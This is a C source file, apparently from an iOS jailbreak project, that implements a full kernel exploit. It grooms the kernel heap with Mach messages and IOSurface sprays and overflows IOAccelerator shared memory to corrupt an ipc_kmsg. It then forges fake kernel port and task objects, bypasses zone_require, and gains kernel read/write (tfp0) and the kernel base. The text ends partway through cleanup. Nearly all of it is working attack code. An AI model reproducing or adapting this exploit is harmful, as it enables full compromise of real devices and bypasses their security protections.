//
//  exploit.c
//  time_waste
//
//  Created by Jake James on 2/22/20.
//  Copyright Â© 2020 Jake James. All rights reserved.
//

#import "wasteoftime.h"
//#include "kernel_memory.h"
//#include "OffsetHolder.h"
#include "ImportantHolders.h"
#include "KernelUtils.h"
#include "reboot.h"
#include "PFOffs.h"
uint32_t transpose(uint32_t val) {
    uint32_t ret = 0;
    for (size_t i = 0; val > 0; i += 8) {
        ret += (val % 255) << i;
        //ret += (val % 255) << i;
        val /= 255;
        //val /= 255;
    }
    return ret + 0x01010101;
}

// get all_properties property from an IOSurfaceRootUserClient mach port. this is an OSDictionary * where all properties are set using setValue
uint64_t get_all_properties(mach_port_t IOSurfaceRootUserClient) {
    uint64_t IOSRUC_port_addr = find_porttw(IOSurfaceRootUserClient); // struct ipc_port *
    uint64_t IOSRUC_addr = rk64tw(IOSRUC_port_addr + koffset_TW(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT_TW)); // IOSurfaceRootUserClient *
    uint64_t IOSC_addr = rk64tw(rk64tw(IOSRUC_addr + 280) + 8 * IOSurface_ID); // IOSurfaceClient *
    uint64_t IOSurface_addr = rk64tw(IOSC_addr + 64); // IOSurface *
    uint64_t all_properties = rk64tw(IOSurface_addr + 232); // OSDictionary *
    return all_properties;
}

uint64_t OSDictionary_objectForKey(uint64_t dict, char *key) {
    uint64_t dict_buffer = rk64tw(dict + 32); // void *
    
    int i = 0;
    uint64_t key_sym = 0;
    do {
        key_sym = rk64tw(dict_buffer + i); // OSSymbol *
        uint64_t key_buffer = rk64tw(key_sym + 16); // char *
        if (!kstrcmp_utw(key_buffer, key)) {
            return rk64tw(dict_buffer + i + 8);
        }
        i += 16;
    }
    while (key_sym);
    
    return 0;
}

uint32_t OSArray_objectCount(uint64_t array) {
    return rk32tw(array + 24);
}

uint64_t OSArray_objectAtIndex(uint64_t array, int idx) {
    uint64_t array_buffer = rk64tw(array + 32); // void *
    return rk64tw(array_buffer + idx * 8);
}

uint64_t OSData_buffer(uint64_t data) {
    return rk64tw(data + 24);
}

void OSData_setBuffer(uint64_t data, uint64_t buffer) {
    wk64tw(data + 24, buffer);
}

uint32_t OSData_length(uint64_t data) {
    return rk32tw(data + 16);
}

void OSData_setLength(uint64_t data, uint32_t length) {
    wk32tw(data + 16, length);
}

uint64_t address_of_property_key(mach_port_t IOSurfaceRootUserClient, uint32_t key) {
    uint64_t all_properties = get_all_properties(IOSurfaceRootUserClient);
    char *skey = malloc(5);
    memcpy(skey, &key, 4);
    uint64_t value = OSDictionary_objectForKey(all_properties, skey);
    free(skey);
    return value;
}

static inline uint32_t mach_port_waitq_flags() {
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type              = WQT_QUEUE;
    waitq_flags.waitq_fifo              = 1;
    waitq_flags.waitq_prepost           = 0;
    waitq_flags.waitq_irq               = 0;
    waitq_flags.waitq_isvalid           = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

uint64_t find_port_via_cuck00(mach_port_t port) {
    uint64_t refs[8] = { 0x4141414141414141, 0x4242424242424242, 0x4343434343434343, 0x4545454545454545, 0x4646464646464646, 0x4747474747474747, 0x4848484848484848, 0x4949494949494949 };

    uint64_t in[3] = { 0, 0, 0 };
    kern_return_t ret = IOConnectCallAsyncStructMethod(IOSurfaceRootUserClient, IOSurfaceRootUserClient_set_notify_selector, port, refs, 8, in, sizeof(in), NULL, NULL);
    
    if (ret) {
        return 0;
    }

    uint64_t id = IOSurface_ID;
    ret = IOConnectCallScalarMethod(IOSurfaceRootUserClient, IOSurfaceRootUserClient_increment_use_count_selector, &id, 1, NULL, NULL);
    if (ret) {
        return 0;
    }

    ret = IOConnectCallScalarMethod(IOSurfaceRootUserClient, IOSurfaceRootUserClient_decrement_use_count_selector, &id, 1, NULL, NULL);
    if (ret) {
        return 0;
    }

    struct {
        mach_msg_header_t head;
        struct {
            mach_msg_size_t size;
            natural_t type;
            uintptr_t ref[8];
        } notify;
        struct {
            kern_return_t ret;
            uintptr_t ref[8];
        } content;
        mach_msg_max_trailer_t trailer;
    } msg = {};
    
    ret = mach_msg(&msg.head, MACH_RCV_MSG, 0, sizeof(msg), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    
    if (ret) {
        return 0;
    }

    return msg.notify.ref[0] & ~3;
}

uint32_t rk32_via_fakeport(mach_port_t fakeport, uint64_t *bsd_info, uint64_t address) {
    *bsd_info = address - koffset_TW(KSTRUCT_OFFSET_PROC_PID_TW);
    uint32_t value = 0x0;
    int ret = pid_for_task(fakeport, (int *)&value);
    if (ret) {
        return 0;
    }
    return value;
}

uint64_t rk64_via_fakeport(mach_port_t fakeport, uint64_t *bsd_info, uint64_t address) {
    uint32_t readp_tmp = rk32_via_fakeport(fakeport, bsd_info, address + 4);
    uint64_t value = rk32_via_fakeport(fakeport, bsd_info, address);
    value |= (uint64_t)readp_tmp << 32;
    return value;
}

// credits to ian beer
static mach_port_t send_kalloc_message_TW(uint8_t *replacer_message_body, uint32_t replacer_body_size)
{
    // allocate a port to send the messages to
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS)
    {
        printf(" [-] failed to allocate port\n");
        exit(EXIT_FAILURE);
    }
    
    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    err = mach_port_set_attributes(mach_task_self(),
                                   q,
                                   MACH_PORT_LIMITS_INFO,
                                   (mach_port_info_t)&limits,
                                   MACH_PORT_LIMITS_INFO_COUNT);
    if (err != KERN_SUCCESS)
    {
        printf(" [-] failed to increase queue limit\n");
        exit(EXIT_FAILURE);
    }
    
    mach_msg_size_t msg_size = sizeof(struct simple_msg) + replacer_body_size;
    struct simple_msg *msg = malloc(msg_size);
    memset(msg, 0, sizeof(struct simple_msg));
    memcpy(&msg->buf[0], replacer_message_body, replacer_body_size);
    
    for (int i = 0; i < 256; i++)
    {
        msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        msg->hdr.msgh_size = msg_size;
        msg->hdr.msgh_remote_port = q;
        msg->hdr.msgh_local_port = MACH_PORT_NULL;
        msg->hdr.msgh_id = 0x41414142;
        
        err = mach_msg(&msg->hdr,
                       MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                       msg_size,
                       0,
                       MACH_PORT_NULL,
                       MACH_MSG_TIMEOUT_NONE,
                       MACH_PORT_NULL);
        
        if (err != KERN_SUCCESS)
        {
            printf(" [-] failed to send message %x (%d): %s\n", err, i, mach_error_string(err));
            exit(EXIT_FAILURE);
        }
    }
    
    return q;
}


// rest is from machswap
void trigger_gc_TW() {
    const int gc_ports_cnt = 500;
    int gc_ports_max = gc_ports_cnt;
    mach_port_t gc_ports[gc_ports_cnt] = { 0 };
    
    uint32_t body_size = (uint32_t)message_size_for_kalloc_size_TW(pagesize) - sizeof(mach_msg_header_t); // 1024
    uint8_t *body = (uint8_t*)malloc(body_size);
    memset(body, 0x41, body_size);
    
    for (int i = 0; i < gc_ports_cnt; i++) {
        uint64_t t0, t1;
        
        t0 = mach_absolute_time();
        gc_ports[i] = send_kalloc_message_TW(body, body_size);
        t1 = mach_absolute_time();
        
        if (t1 - t0 > 1000000) {
            printf("[+] got gc at %d -- breaking\n", i);
            gc_ports_max = i;
            break;
        }
    }
    
    for (int i = 0; i < gc_ports_max; i++) {
        mach_port_destroy(mach_task_self(), gc_ports[i]);
    }
    
    sched_yield();
}


uint64_t kernel_base = 0;

#define MB * 1024 * 1024

int get_tfp0_waste() {
    void *data = NULL;
    mach_port_t ports[200] = {};
    mach_port_t new_tfp0 = MACH_PORT_NULL;
    //util_info("fuck");
    int ret = init_offsets_TW();
    if (ret) {
        util_error("[-] iOS version not supported");
        goto err;
    }
    util_info("Initialized offsets");
    
    
    ret = init_IOAccelerator();
    if (ret) {
        util_error("[-] Failed to init IOAccelerator");
        goto err;
    }
    util_info("Initialized IOAccelerator");
    
    ret = init_IOSurface();
    if (ret) {
        util_error("[-] Failed to init IOSurface");;
        goto err;
    }
    util_info("Initialized IOSurface");
    
    // setup 200 ports for later use
    for (int i = 0; i < 200; i++) {
        ports[i] = new_mach_port_TW();
    }
    int port_i = 0;
#define POP_PORT() ports[port_i++]
        
    
    // ----------- heap pre-exploit setup ----------- //
    
  //  util_info("Doing stage 0 heap setup");

    // ten thousand functions just for 20 lines of code bazad??
    
    // fill kalloc_map so new allocations are always done in kernel_map (where our buffer that will get overflowed is)
    mach_port_t saved_ports[10];
    mach_msg_size_t msg_size = message_size_for_kalloc_size_TW(7 * pagesize) - sizeof(struct simple_msg);
    data = calloc(1, msg_size);
    size_t stage0_sz = pagesize == 0x4000 ? 10 MB : 5 MB;
    for (int i = 0; i < 10; i++) {
        saved_ports[i] = POP_PORT();
        for (int j = 0; j < stage0_sz / (7 * pagesize); j++) {
            kern_return_t ret = send_message_TW(saved_ports[i], data, msg_size);
            if (ret) {
                util_error("[-] Failed to send message");
                goto err;
            }
        }
    }
    
    free(data);
    data = NULL;
    
    // we'll never do allocations smaller than 8 pages, so create some 7 page holes so the system can do small allocations there and leave us in peace
    mach_port_destroy(mach_task_self(), saved_ports[0]);
    mach_port_destroy(mach_task_self(), saved_ports[2]);
    mach_port_destroy(mach_task_self(), saved_ports[4]);
    mach_port_destroy(mach_task_self(), saved_ports[5]);
    mach_port_destroy(mach_task_self(), saved_ports[7]);
    mach_port_destroy(mach_task_self(), saved_ports[9]);
    
    // make a bunch of 8 page allocations to ensure there are no holes that mess with our allocations
    mach_port_t spray = POP_PORT();
    msg_size = message_size_for_kalloc_size_TW(8 * pagesize) - sizeof(struct simple_msg);
    data = calloc(1, msg_size);
    for (int i = 0; i < MACH_PORT_QLIMIT_LARGE; i++) {
        kern_return_t ret = send_message_TW(spray, data, msg_size);
        if (ret) {
            util_error("[-] Failed to send message");
            goto err;
        }
    }
   
    // ----------- heap stage 1 setup -----------//
    
   // util_info("Doing stage 1 heap setup");
    
    int property_index = 0;
    uint32_t huge_kalloc_key = transpose(property_index++);
    //ret = IOSurface_empty_kalloc(22 MB, huge_kalloc_key);
    ret = IOSurface_empty_kalloc(82 MB, huge_kalloc_key);
    if (ret) {
        util_error("[-] Failed to allocate empty kalloc buffer");
        goto err;
    }
    
    // setup the buffers that we'll overflow
    struct IOAccelDeviceShmemData cmdbuf, seglist;
    //ret = alloc_shmem(36 MB, &cmdbuf, &seglist);
    ret = alloc_shmem(96 MB, &cmdbuf, &seglist);
    if (ret) {
        util_error("[-] Failed to allocate shared memory");
        goto err;
    }
    
    // heap now:
    // ------------------+------------------+------------------+----------------
    //     huge kalloc   |   segment list   |  command buffer  |
    // ------------------+------------------+------------------+----------------
    //
    
    // port which we will later corrupt. should be exactly after command buffer
    mach_port_t corrupted_kmsg_port = POP_PORT();
    ret = send_message_TW(corrupted_kmsg_port, data, (uint32_t)message_size_for_kalloc_size_TW(8 * pagesize) - sizeof(struct simple_msg));
    if (ret) {
        util_error("[-] Failed to send message");
        goto err;
    }
    
    // now:
    // ------------------+------------------+------------------+-----------------+-----------
    //     huge kalloc   |   segment list   |  command buffer  | struct ipc_kmsg |
    // ------------------+------------------+------------------+-----------------+-----------
    //
    
    // this is a placeholder, we need it allocated for now but later it'll be freed and allocated with controlled data which will be UAFd
    mach_port_t placeholder_message_port = POP_PORT();
    ret = send_message_TW(placeholder_message_port, data, (uint32_t)message_size_for_kalloc_size_TW(8 * pagesize) - sizeof(struct simple_msg));
    if (ret) {
        util_error("[-] Failed to send message");
        goto err;
    }
    
    // allocate ool buffer which we'll also UAF
    mach_port_t ool_message_port = POP_PORT();
    int ool_ports_count = (7 * pagesize) / sizeof(uint64_t) + 1;
    ret = send_ool_ports_TW(ool_message_port, MACH_PORT_NULL, ool_ports_count, MACH_MSG_TYPE_COPY_SEND);
    if (ret) {
        util_error("[-] Failed to send ool ports message");
        goto err;
    }
    
    // now:
    // ------------------+------------------+------------------+-----------------+-------------------+-----------+
    //     huge kalloc   |   segment list   |  command buffer  | struct ipc_kmsg | struct ipc_kmsg 2 | ool ports |
    // ------------------+------------------+------------------+-----------------+-------------------+-----------+
    //
    //trigger_gc_TW();
    // free huge allocation
    ret = IOSurface_remove_property(huge_kalloc_key);
    if (ret) {
        util_error("[-] Failed to remove IOSurface property");
        goto err;
    }
    
    // now:
    // ------------+------------------+------------------+-----------------+-------------------+-----------+
    //     free    |   segment list   |  command buffer  | struct ipc_kmsg | struct ipc_kmsg 2 | ool ports |
    // ------------+------------------+------------------+-----------------+-------------------+-----------+
    //
    
    void *spray_buffer = ((uint8_t *) cmdbuf.data) + pagesize;

    uint32_t kfree_buffer_key = transpose(property_index++);
    memset(spray_buffer, 0x42, 8 * pagesize); // we'll need later in clean up to check if memory is still allocated
   // ret = IOSurface_kmem_alloc_spray(spray_buffer, 8 * pagesize, 30 MB / (8 * pagesize), kfree_buffer_key);
    ret = IOSurface_kmem_alloc_spray(spray_buffer, 8 * pagesize, 72 MB / (8 * pagesize), kfree_buffer_key);
    if (ret) {
        util_error("[-] Failed to spray");
        goto err;
    }
    
    mach_port_destroy(mach_task_self(), placeholder_message_port);
    
    // now:
    // +------------------+------------------+-----------------+--------+-----------+--------------+
    // |   segment list   |  command buffer  | struct ipc_kmsg |  free  | ool ports | kfree_buffer |
    // +------------------+------------------+-----------------+--------+-----------+--------------+
    //
    
    uint32_t spray_key = transpose(property_index++);
    //ret = IOSurface_kmem_alloc_spray(spray_buffer, 8 * pagesize, 82 MB / (8 * pagesize), spray_key);
    ret = IOSurface_kmem_alloc_spray(spray_buffer, 8 * pagesize, 82 MB / (8 * pagesize), spray_key);
    if (ret) {
        util_error("[-] Failed to spray");
        goto err;
    }
    
    // now:
    // +------------------+------------------+-----------------+--------------+-----------+--------------+
    // |   segment list   |  command buffer  | struct ipc_kmsg | spray_buffer | ool_ports | kfree_buffer |
    // +------------------+------------------+-----------------+--------------+-----------+--------------+
    //
    
    size_t minimum_corrupted_size = 3 * (8 * pagesize) - 0x58; // 0x5ffa8 on 16K and 0x17fa8 on 4K 0x17fa8;//
    int triedtoomany = 0;

retry:;
    int overflow_size = 0;
    uint64_t ts = mach_absolute_time();
    if (minimum_corrupted_size < ts && ts <= ((minimum_corrupted_size << 8) | 0xff)) {
        overflow_size = 8;
    }
    else if (((minimum_corrupted_size << 8) | 0xff) < ts && ts <= ((minimum_corrupted_size << 16) | 0xffff)) {
        overflow_size = 7;
    }
    else if (((minimum_corrupted_size << 16) | 0xffff) < ts && ts <= ((minimum_corrupted_size << 24) | 0xffffff)) {
        overflow_size = 6;
    }
    else if (((minimum_corrupted_size << 24) | 0xffffff) < ts && ts <= ((minimum_corrupted_size << 32) | 0xffffffff)) {
        overflow_size = 5;
    }
    
    else if (((minimum_corrupted_size << 32) | 0xffffffff) < ts && ts <= ((minimum_corrupted_size << 36) | 0xffffffffff)) {
        overflow_size = 4;
    }
   
    else if (((minimum_corrupted_size << 36) | 0xffffffffff) < ts && ts <= ((minimum_corrupted_size << 40) | 0xffffffffffff)) {
        overflow_size = 3;
    }
    
    uint32_t ipc_kmsg_size = (uint32_t) (ts >> (8 * (8 - overflow_size)));
    if (ipc_kmsg_size < (minimum_corrupted_size + 1) || ipc_kmsg_size > 0x0400a8ff) {
        util_error("[-] Probably won't work with this timestamp, retrying...");
        usleep(100);
        triedtoomany = triedtoomany+1;
        util_error("triedtoomany: %d", triedtoomany);
        if (triedtoomany > 5){
            util_error("triedtoomany: %d", triedtoomany);
            util_error("failed oh so much, goodbye");
            //reboot(RB_QUICK);
//xFinishFailed();
            goto err;
        }
        goto retry;
    }
    
    //util_info("Triggering bug with %d bytes", overflow_size);
    //overflow_n_bytes(36 MB, overflow_size, &cmdbuf, &seglist);
    overflow_n_bytes(96 MB, overflow_size, &cmdbuf, &seglist);
    //util_info("Corruption worked?");
    usleep(100);
    mach_port_destroy(mach_task_self(), corrupted_kmsg_port);
    //util_info("Freed kmsg");
    usleep(100);
    mach_port_t message_leaking_port = POP_PORT();
    
    // now:
    // +------------------+------------------+------+------+------+------+----------------------+
    // |   segment list   |  command buffer  | free | free | free | free | part of kfree_buffer |
    // +------------------+------------------+------+------+------+------+----------------------+
    //
    
    for (int i = 0; i < 824; i++) {
//        for (int i = 0; i < 1024; i++) {
        ret = send_message_TW(message_leaking_port, data, (uint32_t)message_size_for_kalloc_size_TW(8 * pagesize) - sizeof(struct simple_msg));
        //printf(".");
        if (ret) {
            util_error("[-] Failed to send message");
            goto err;
        }
    }

    mach_port_t message_leaking_port_2 = MACH_PORT_NULL;
    if (pagesize == 0x1000) {
        message_leaking_port_2 = POP_PORT();
        for (int i = 0; i < 824; i++) {
            //for (int i = 0; i < 1024; i++) {
            //printf("+");

            ret = send_message_TW(message_leaking_port_2, data, (uint32_t)message_size_for_kalloc_size_TW(8 * pagesize) - sizeof(struct simple_msg));
            if (ret) {
                util_error("[-] Failed to send message");
                goto err;
            }
        }
    }

    // now:
    // +------------------+------------------+----------+----------+----------+----------+----------------------+
    // |   segment list   |  command buffer  | ipc_kmsg | ipc_kmsg | ipc_kmsg | ipc_kmsg | part of kfree_buffer |
    // +------------------+------------------+----------+----------+----------+----------+----------------------+
    //
    util_info("free");
    usleep(100);

    free(data);
    data = NULL;
  //  util_info("[+] made it here");

    uint32_t argsSz = sizeof(struct IOSurfaceValueArgs) + 2 * sizeof(uint32_t);
    struct IOSurfaceValueArgs *in = malloc(argsSz);
    bzero(in, argsSz);
    in->surface_id = IOSurface_ID;
    in->binary[0] = spray_key;
    in->binary[1] = 0;
    //sched_yield();
    //trigger_gc_please();
    // this buffer is now an ipc_kmsg struct, read it back
    size_t out_size = 96 MB; // make it bigger than actual; that works for both cases
    //size_t out_size = 46 MB; // make it bigger than actual; that works for both cases
    //util_info("iosurfacegetvalue: %d", ret);
    usleep(10000);
    ret = IOSurface_getValue(in, 16, spray_buffer, &out_size);
    //util_info("iosurfacegetvalue: %d", ret);
    if (ret) {
        util_error("[-] Failed to read back value");
        goto err;
    }
    

    free(in);
    //util_info("[+] OH Boy She's a panicker");
    //sched_yield();
   //
    uint32_t ikm_size = 8 * (uint32_t)pagesize - 0x58;
    //uint32_t ikm_size = 8 * (uint32_t)pagesize - 0x58;
    util_info("ikm_size: %d", ikm_size);

    void *ipc_kmsg = memmem(spray_buffer, out_size, &ikm_size, sizeof(ikm_size));
    if (!ipc_kmsg) {
        util_error("[-] Failed to leak ipc_kmsg");
        //reboot(RB_QUICK);
        //exit(0);
        goto err;
    }
   // util_info("[+] made it 4");
    // trigger_gc_please();

    // ikm_header = beginning of struct + something, we can use this to calculate the address of the shared memory buffer
    uint64_t ikm_header = *(uint64_t*)(ipc_kmsg + 24);
    uint64_t segment_list_addr = ikm_header - 96 MB - 96 MB - 8 * pagesize - 2 * pagesize - 0x28;
    //uint64_t segment_list_addr = ikm_header - 96 MB - 96 MB - 8 * pagesize - 2 * pagesize - 0x28;

    //util_info("nikm_header leak: 0x%llx", ikm_header);
    //util_info("Segment list calculated to be at: 0x%llx", segment_list_addr);
    uint64_t fake_port_page_addr = segment_list_addr + 96 MB; // = addr of command buffer
    uint64_t fake_port_addr = fake_port_page_addr + 0x100;
    
    uint64_t fake_task_page_addr = segment_list_addr + pagesize + 96 MB; // = addr of command buffer + pagesizetw
    uint64_t fake_task_addr = fake_task_page_addr + 0x100;
    
    data = malloc(8 * pagesize);
    for (int i = 0; i < 8 * pagesize / 8; i++) {
        ((uint64_t*)data)[i] = fake_port_addr;
    }
    
    mach_port_destroy(mach_task_self(), message_leaking_port);
    if (message_leaking_port_2) mach_port_destroy(mach_task_self(), message_leaking_port_2);
    
    // now:
    // +------------------+------------------+------+------+------+------+----------------------+
    // |   segment list   |  command buffer  | free | free | free | free | part of kfree_buffer |
    // +------------------+------------------+------+------+------+------+----------------------+
    //
    
    uint32_t ool_ports_realloc_key = transpose(property_index++);
    ret = IOSurface_kmem_alloc_spray(data, 8 * pagesize, 1000, ool_ports_realloc_key);
    if (ret) {
        util_error("[-] Failed to spray");
        goto err;
    }

    // bazad's fix for a kernel data abort
    make_buffer_readable_by_kernel(cmdbuf.data, 2);
    memset(cmdbuf.data, 0, 2 * pagesize);
    
    // setup fake port & fake task
    kport_t *fake_port = cmdbuf.data + 0x100;
    ktask_t *fake_task = cmdbuf.data + pagesize + 0x100;
        
    uint8_t *fake_port_page = cmdbuf.data;
    uint8_t *fake_task_page = cmdbuf.data + pagesize;

    // zone_require bypass
    *(fake_port_page + 0x16) = 42;
#if __arm64e__
    *(fake_task_page + 0x16) = 57;
#else
    *(fake_task_page + 0x16) = 58;
#endif
        
    fake_port->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fake_port->ip_references = 0xd00d;
    fake_port->ip_lock.type = 0x11;
    fake_port->ip_messages.port.receiver_name = 1;
    fake_port->ip_messages.port.msgcount = 0;
    fake_port->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
    fake_port->ip_messages.port.waitq.flags = mach_port_waitq_flags();
    fake_port->ip_srights = 99;
    fake_port->ip_kobject = fake_task_addr;
        
    fake_task->ref_count = 0xff;
    fake_task->lock.data = 0x0;
    fake_task->lock.type = 0x22;
    fake_task->ref_count = 100;
    fake_task->active = 1;
    
    // receive back the fake ports
    struct ool_msg *ool = (struct ool_msg *)receive_message_TW(ool_message_port, sizeof(struct ool_msg) + 0x1000);
    mach_port_t fakeport = ((mach_port_t *)ool->ool_ports.address)[0];
    free(ool);
    ool = NULL;
    
    if (!fakeport) {
        util_error("[-] Didn't get fakeport???");
        goto err;
    }
    
    util_info("fakeport: 0x%x", fakeport);
    
    // will use cuck00 until i figure out why MACH_MSG_TYPE_MOVE_RECEIVE triggers a zone_require panic
    // why does this not work with mach_task_self()
    uint64_t leaked_port_addr = find_port_via_cuck00(ool_message_port);
    if (!leaked_port_addr) {
        util_error("[-] Failed to leak port address");
        goto err;
    }
    util_info("Leaked port: 0x%llx", leaked_port_addr);

    // ----------- kernel read ----------- //
    
    uint64_t *read_addr_ptr = (uint64_t *)((uint64_t)fake_task + koffset_TW(KSTRUCT_OFFSET_TASK_BSD_INFO_TW));
    
#define kr32(addr) rk32_via_fakeport(fakeport, read_addr_ptr, addr)
#define kr64(addr) rk64_via_fakeport(fakeport, read_addr_ptr, addr)

    uint64_t ipc_space = kr64(leaked_port_addr + koffset_TW(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER_TW));
    if (!ipc_space) {
        util_error("[-] Kernel read failed!");
        goto err;
    }
    util_info("Got kernel read");
    
    uint64_t kernel_vm_map = 0;
    uint64_t ipc_space_kernel = 0;
    uint64_t our_port_addr = 0;
    
    uint64_t struct_task = kr64(ipc_space + koffset_TW(KSTRUCT_OFFSET_IPC_SPACE_IS_TASK_TW));
    our_port_addr = kr64(struct_task + koffset_TW(KSTRUCT_OFFSET_TASK_ITK_SELF_TW));
    ipc_space_kernel = kr64(our_port_addr + offsetof(kport_t, ip_receiver));
    int checkourpid = getpid();
    while (struct_task) {
        uint64_t bsd_info = kr64(struct_task + koffset_TW(KSTRUCT_OFFSET_TASK_BSD_INFO_TW));

        int pid = kr32(bsd_info + koffset_TW(KSTRUCT_OFFSET_PROC_PID_TW));
        if (pid == checkourpid) {
            our_procStruct_addr_exported = bsd_info;
            util_info("our proc Proc_structure addr: 0x%llx", our_procStruct_addr_exported);
            set_selfproc(our_procStruct_addr_exported);

        }
        
        if (pid == 0) {
            /* find kernproc by looping linked list */
            our_kernel_procStruct_exportAstylez = bsd_info;
            util_info("our kernel Proc_structure addr: 0x%llx", our_kernel_procStruct_exportAstylez);
            
            our_kernel_taskStruct_exportAstylez =  kr64(our_kernel_procStruct_exportAstylez + koffset_TW(KSTRUCT_OFFSET_PROC_TASK_TW));
            util_info("our kernel task addr: 0x%llx", our_kernel_taskStruct_exportAstylez);
            //SETOFFSET(kernel_task, our_kernel_taskStruct_exportAstylez);
            
            kernel_vm_map = kr64(struct_task + koffset_TW(KSTRUCT_OFFSET_TASK_VM_MAP_TW));
            break;
        }
        
        struct_task = kr64(struct_task + koffset_TW(KSTRUCT_OFFSET_TASK_PREV_TW));
    }
    
    util_info("Our task port: 0x%llx", our_port_addr);
    
    // ----------- tfp0! ----------- //
    
    fake_port->ip_receiver = ipc_space_kernel;
    *(uint64_t *)((uint64_t)fake_task + koffset_TW(KSTRUCT_OFFSET_TASK_VM_MAP_TW)) = kernel_vm_map;
    *(uint32_t *)((uint64_t)fake_task + koffset_TW(KSTRUCT_OFFSET_TASK_ITK_SELF_TW)) = 1;
    
    util_info("[+] Updated port for tfp0!");
    
    init_kernel_memorytw(fakeport, our_port_addr);
    
    uint64_t addr = kalloctw(8);
    if (!addr) {
        util_error("[-] Seems like tfp0 port didn't work?");
        goto err;
    }
    
    util_info("Allocated: 0x%llx", addr);
    wk64tw(addr, 0x4141414141414141);
    uint64_t readb = rk64tw(addr);
    kfreetw(addr, 8);
    util_info("Read back: 0x%llx", readb);
    
    if (readb != 0x4141414141414141) {
        util_error("[-] Read back value didn't match");
        goto err;
    }
    
    util_info("Creating safer port");
    
    new_tfp0 = POP_PORT();
    if (!new_tfp0) {
        util_error("[-] Failed to allocate new tfp0 port");
        goto err;
    }
    
    uint64_t new_addr = find_porttw(new_tfp0);
    if (!new_addr) {
        util_error("[-] Failed to find new tfp0 port address");
        goto err;
    }
    
    uint64_t faketask = kalloctw(pagesize);
    if (!faketask) {
        util_error("[-] Failed to kalloc faketask");
        goto err;
    }
    
    kwritetw(faketask, fake_task_page, pagesize);
    fake_port->ip_kobject = faketask + 0x100;
    
    kwritetw(new_addr, (const void*)fake_port, sizeof(kport_t));
    
    util_info("Testing new tfp0 port");
    
    init_kernel_memorytw(new_tfp0, our_port_addr);
    set_tfp0(new_tfp0);
    tfp0_exportedBYTW = new_tfp0;

    addr = kalloctw(8);
    if (!addr) {
        util_error("[-] Seems like the new tfp0 port didn't work?");
        goto err;
    }
    
    util_info("tfp0: 0x%x", new_tfp0);
    util_info("Allocated: 0x%llx", addr);
    wk64tw(addr, 0x4141414141414141);
    readb = rk64tw(addr);
    kfreetw(addr, 8);
    util_info("Read back: 0x%llx", readb);
    
    if (readb != 0x4141414141414141) {
        util_error("[-] Read back value didn't match");
        goto err;
    }
    
    // ----------- find kernel base ----------- //
    
    uint64_t IOSurface_port_addr = find_porttw(IOSurfaceRootUserClient);
    uint64_t IOSurface_object = rk64tw(IOSurface_port_addr + koffset_TW(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT_TW));
    uint64_t vtable = rk64tw(IOSurface_object);
    vtable |= 0xffffff8000000000; // in case it has PAC
    uint64_t function = rk64tw(vtable + 8 * koffset_TW(OFFSET_GETFI_TW));
    function |= 0xffffff8000000000; // this address is inside the kernel image
    uint64_t page = trunc_page_kernel(function);
   
    while (true) {
        if (rk64tw(page) == 0x0100000cfeedfacf && (rk64tw(page + 8) == 0x0000000200000000 || rk64tw(page + 8) == 0x0000000200000002)) {
            kernel_base = page;
            break;
        }
        page -= pagesize;
    }
    
    util_info("Kernel base: 0x%llx", kernel_base);
    kernelbase_exportedBYTW = kernel_base;
    // ----------- clean up ----------- //

    util_info("[-] Cleaning up...");
    uint64_t our_task_addr = rk64tw(our_port_addr + koffset_TW(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT_TW));
    uint64_t itk_space = rk64tw(our_task_addr + koffset_TW(KSTRUCT_OFFSET_TASK_ITK_SPACE_TW));
    uint64_t is_table = rk64tw(itk_space + koffset_TW(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE_TW));
    our_port_addr_exportedBYTW = our_port_addr;
    our_task_addr_exportedBYTW = our_task_addr;
    
    set_selfproc(our_port_addr_exportedBYTW);
    set_task_self_addr(our_task_addr_exportedBYTW);
    uint32_t port_index = fakeport >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    // remove references to the first tfp0 port which is located in the command buffer
    wk32tw(is_table + (port_index * sizeof_ipc_entry_t) + 8, 0);
    wk64tw(is_table + (port_index * sizeof_ipc_entry_t), 0);
    fakeport = MACH_PORT_NULL;
    
    // remove our receive right of new_tfp0 to prevent it from dying on app exit
    port_index = new_tfp0 >> 8;
    uint32_t ie_bits = rk32tw(is_table + (port_index * sizeof_ipc_entry_t) + 8);
    ie_bits &= ~MACH_PORT_TYPE_RECEIVE;
    wk32tw(is_table + (port_index * sizeof_ipc_entry_t) + 8, ie_bits);
    
    // after this command buffer & segment list can be freed safely
    
    uint64_t spray_array = address_of_property_key(IOSurfaceRootUserClient, spray_key); // OSArray *
    uint32_t count = OSArray_objectCount(spray_array);
    for (int i = 0; i < count; i++) {
        uint64_t object = OSArray_objectAtIndex(spray_array, i); // OSData *
        uint64_t buffer = OSData_buffer(object);
        if (buffer == segment_list_addr + 96 MB + 96 MB + 8 * pagesize) {
            util_info("Found corrupted OSData buffer at 0x%llx", buffer);
            OSData_setLength(object, 0); // null out the size, this buffer was freed & reallocated
            break;
        }
    }
    // now we should be able to free this
    IOSurface_remove_property(spray_key);
    
    uint64_t ool_array = address_of_property_key(IOSurfaceRootUserClient, ool_ports_realloc_key); // OSArray *
    count = OSArray_objectCount(ool_array);
    for (int i = 0; i < count; i++) {
        uint64_t object = OSArray_objectAtIndex(ool_array, i); // OSData *
        uint64_t buffer = OSData_buffer(object);
        if (buffer == segment_list_addr + 96 MB + 96 MB + 8 * pagesize + 8 * pagesize) {
            util_info("Found corrupted OSData buffer at 0x%llx", buffer);
            OSData_setLength(object, 0);
            break;
        }
    }
    IOSurface_remove_property(ool_ports_realloc_key);

